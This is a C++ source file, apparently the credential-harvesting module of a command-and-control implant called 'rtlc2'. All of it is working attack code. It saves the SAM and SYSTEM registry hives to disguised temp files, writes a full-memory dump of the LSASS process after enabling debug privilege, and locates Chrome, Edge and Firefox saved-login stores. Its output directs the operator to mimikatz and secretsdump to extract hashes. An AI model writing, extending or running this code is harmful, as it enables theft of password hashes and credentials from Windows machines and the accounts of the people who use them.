// Credential Harvesting - Extract credentials from Windows
// SAM dump, LSASS minidump, browser credentials
#include "agent.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <cstring>
#include <string>
#include <sstream>
#include <vector>
#include <fstream>

#pragma comment(lib, "dbghelp.lib")

namespace rtlc2 {
namespace modules {

// Find process by name and return PID
static DWORD FindProcessByName(const char* name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

// Enable a privilege on the current process token
static bool EnablePrivilege(const char* privilege) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp = {};
    if (!LookupPrivilegeValueA(NULL, privilege, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && GetLastError() == ERROR_SUCCESS;
}

// Dump SAM registry hive
std::string DumpSAM() {
    EnablePrivilege("SeBackupPrivilege");

    char tempDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tempDir);

    char samPath[MAX_PATH], sysPath[MAX_PATH];
    snprintf(samPath, MAX_PATH, "%s\\s.tmp", tempDir);
    snprintf(sysPath, MAX_PATH, "%s\\y.tmp", tempDir);

    // Save SAM and SYSTEM hives
    HKEY hSam, hSys;
    bool ok = true;

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SAM", 0, KEY_READ, &hSam) == ERROR_SUCCESS) {
        if (RegSaveKeyA(hSam, samPath, NULL) != ERROR_SUCCESS) ok = false;
        RegCloseKey(hSam);
    } else {
        ok = false;
    }

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM", 0, KEY_READ, &hSys) == ERROR_SUCCESS) {
        if (RegSaveKeyA(hSys, sysPath, NULL) != ERROR_SUCCESS) ok = false;
        RegCloseKey(hSys);
    } else {
        ok = false;
    }

    if (!ok) {
        DeleteFileA(samPath);
        DeleteFileA(sysPath);
        return "Failed to save SAM/SYSTEM hives (requires SYSTEM privileges)";
    }

    // Read files for exfiltration
    std::ostringstream out;
    out << "SAM hive saved to: " << samPath << "\n";
    out << "SYSTEM hive saved to: " << sysPath << "\n";
    out << "Use secretsdump.py or mimikatz to extract hashes offline\n";

    return out.str();
}

// MiniDump LSASS process
std::string DumpLSASS() {
    EnablePrivilege("SeDebugPrivilege");

    DWORD lsassPid = FindProcessByName("lsass.exe");
    if (!lsassPid) return "Could not find lsass.exe";

    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
    if (!hProc) return "Failed to open lsass.exe (PID " + std::to_string(lsassPid) + "): " +
                        std::to_string(GetLastError());

    char tempDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tempDir);
    char dumpPath[MAX_PATH];
    snprintf(dumpPath, MAX_PATH, "%s\\d.tmp", tempDir);

    HANDLE hFile = CreateFileA(dumpPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProc);
        return "Failed to create dump file";
    }

    BOOL ok = MiniDumpWriteDump(hProc, lsassPid, hFile,
                                 MiniDumpWithFullMemory, NULL, NULL, NULL);
    CloseHandle(hFile);
    CloseHandle(hProc);

    if (!ok) {
        DeleteFileA(dumpPath);
        return "MiniDumpWriteDump failed: " + std::to_string(GetLastError());
    }

    return std::string("LSASS dump saved to: ") + dumpPath +
           "\nUse mimikatz or pypykatz to extract credentials";
}

// Extract Chrome/Edge saved passwords (encrypted with DPAPI)
std::string ExtractBrowserCreds() {
    std::ostringstream out;

    char appData[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData) != S_OK)
        return "Failed to get AppData path";

    // Check for Chrome Login Data
    std::string chromePath = std::string(appData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
    std::string edgePath = std::string(appData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";

    auto checkBrowser = [&](const std::string& path, const char* name) {
        DWORD attrs = GetFileAttributesA(path.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES) {
            out << name << " Login Data found at: " << path << "\n";
            // The file is SQLite3 - would need to copy and parse
            // Credentials are encrypted with DPAPI (CryptUnprotectData)
            out << "  -> Copy file and use CryptUnprotectData or dpapi.py to decrypt\n";
        }
    };

    checkBrowser(chromePath, "Chrome");
    checkBrowser(edgePath, "Edge");

    // Firefox profiles
    std::string ffPath = std::string(appData) + "\\..\\Roaming\\Mozilla\\Firefox\\Profiles";
    DWORD attrs = GetFileAttributesA(ffPath.c_str());
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        out << "Firefox profiles found at: " << ffPath << "\n";
        out << "  -> key4.db + logins.json contain encrypted credentials\n";
    }

    if (out.str().empty()) return "No browser credential stores found";
    return out.str();
}

// Master credential dump function
std::string HashDump(const std::string& method) {
    if (method == "sam") return DumpSAM();
    if (method == "lsass") return DumpLSASS();
    if (method == "browser") return ExtractBrowserCreds();
    if (method == "all") {
        std::ostringstream out;
        out << "=== SAM Dump ===\n" << DumpSAM() << "\n";
        out << "=== LSASS Dump ===\n" << DumpLSASS() << "\n";
        out << "=== Browser Creds ===\n" << ExtractBrowserCreds() << "\n";
        return out.str();
    }
    return "Usage: hashdump <sam|lsass|browser|all>";
}

} // namespace modules
} // namespace rtlc2

#endif // RTLC2_WINDOWS
